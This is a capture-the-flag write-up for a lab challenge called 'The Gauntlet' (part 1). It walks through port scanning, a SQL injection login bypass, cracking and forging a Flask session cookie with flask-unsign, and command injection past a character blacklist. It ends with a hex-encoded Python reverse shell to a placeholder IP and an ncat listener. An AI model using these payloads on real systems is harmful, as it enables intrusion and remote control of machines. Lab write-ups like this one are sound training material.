
# The Gauntlet - Part 1

**Challenge Prompt:**

> So, you think you're a l33t h4xx0r? Alright, here's my little gauntlet to you then:  
> Break in through the website and get a shell one way or another. Once that's done, escalate your privileges and own the box.  
>
> You won't be needing any fancy kernel exploits or such, this one's all about bad practices and misconfigurations. Doesn't sound too hard, now does it? Good luck!

Flag binaries are located at /home/*****/user.flag and /root/root.flag  
the-gauntlet.hkn

## Prerequisites

This writeup will be missing the rabbit holes, and other wrong paths I took. I decided to do this to save time so I can write more writeups. I might decide to write a more complete one later, so this will be a writeup in the mind of someone not doing any mistakes. But I’m happy to talk on the discord to discuss the challenge.

## Finding ports

There is no website available at the ip we get from the Campfire. So next step is to port scan to figure where to start.

```bash
nmap -sV -v the-gauntlet.hkn
```

The result is back

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have ssh port open at 22 and tcp port at 5000.

## Website

When going to the-gauntlet.hkn:5000 we get to a website with following html

```html
...
<body>
    <div class="container">
        <h1>Welcome.</h1>
        <p>This is my small gauntlet to you.</p>
        <p>It's simple: find a way in, get a shell
        <!-- (no flag before that!) -->, escalate your privileges
        <!-- .. a few times .. -->.</p>
        <p>There will be no need for web enumeration
        <!-- (scanning for files/directories, etc.) -->. 
        The steps ahead should be clear to you.</p>
        <p>Once you have a shell on the box, 
        deep enumeration shouldn't be necessary.</p>
        <p>Enjoy.</p>
        <a href="/login">Login</a> |
        <a href="/admin">Admin</a> 
    </div>
</body>
</html>
```

## Login page

We see there are links to a login and admin page. Admin page responds with

```
Access denied. Admins only.
```

Login page allows us to input username and password.

We don’t know any accounts, so usually when there is no source code it can be a sign of sql injection.

After looking at sql injection cheatsheets, this worked to login.

```
' OR 1==1; --
```

We get following html after logging in

```html
...
<body>
    <div class="container">
        <h1>Welcome Bob!</h1>
        <p>You are a regular user.</p>
        <a href="/logout">Logout</a> |
        <a href="/admin">Admin</a>
    </div>
</body>
</html>
```

So we are not admin yet.

## Flask Session

When looking at requests while logging in, we get a flask session cookie

```
eyJ1c2VyIjp7ImlzX2FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiJCb2IifX0.Z9VHJQ.-m3orXMcfEzMkMWdElSF0LcclfY
```

Putting the token into jwt.io we get the following decoded header

```json
{
  "user": {
    "is_admin": false,
    "username": "Bob"
  }
}
```

So knowing the code had a sql injection, it could be possible for the secret being weak.

`flask-unsign` is a known tool that makes cracking this easier.

I download rockyou.txt as it’s a low hanging fruit password list and try it out with the unsign option.

```bash
flask-unsign --unsign --cookie "eyJ1c2VyIjp7ImlzX2FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiJCb2IifX0.Z9VHJQ.-m3orXMcfEzMkMWdElSF0LcclfY" --no-literal-eval --wordlist rockyou.txt 
```

We then get back

```
[*] Session decodes to: {'user': {'is_admin': False, 'username': 'Bob'}}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 11264 attempts
b'itsasecret'
```

We can use the secret to create our own token that works with the website.

```bash
flask-unsign --sign --cookie "{'user': {'is_admin': True, 'username': 'Bob'}}" --secret 'itsasecret'
```

this generated the token

```
eyJ1c2VyIjp7ImlzX2FkbWluIjp0cnVlLCJ1c2VybmFtZSI6IkJvYiJ9fQ.Z9VLGA.Y36X4rBlVwVDoXUAMsUjGnkI-GM
```

## Remote Code Execution

and we can then login as the admin by replacing our session token with the token we in previous section

```html
...
<body>
    <div class="container">
        <h2>Admin Page</h2>
        <pre></pre>
        <form method="post">
            Host check: <input type="text" name="command" value="127.0.0.1"><br>
            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
```

When we try to submit we get the following output back in the html

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
```

This looks like a result of a ping command, so next step seems to do a command injection to get access to the box.

Trying out different escape sequences reveals there is a blacklist of characters. Quick example is submitting a ; results in following message

```
Illegal characters detected!
```

I found that `$(whoami)` works and gives us the error

```
ping: user1: Name or service not known
```

Space is also banned, but `${IFS}` works as an alternative to space.

I decided to use python3 and decoding hex to get a reverse shell

```bash
$(python3${IFS}-c${IFS}'exec(bytes.fromhex("696d706f7274206f732c7074792c736f636b65743b733d736f636b65742e736f636b657428293b732e636f6e6e656374282822782e782e782e78222c313530343329293b5b6f732e6475703228732e66696c656e6f28292c6629666f72206620696e28302c312c32295d3b7074792e737061776e2822626173682229").decode())')
```

The bytes from hex is following code

```python
import os,pty,socket;s=socket.socket();s.connect(("x.x.x.x",15043));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
```

Where `x.x.x.x` needs to be your ip either found in the browser lab, or vpn settings.

I open up a reverse proxy listener with following command

```bash
ncat -lvnp 15043
```

After sending the command I get access to the shell.

## Flag

We run the command `./user.flag` and get the flag for part 1

```
DDC{n0th1ng_l1k3_4_b1t_0f_RCE}
```

The challenge continues with part 2.
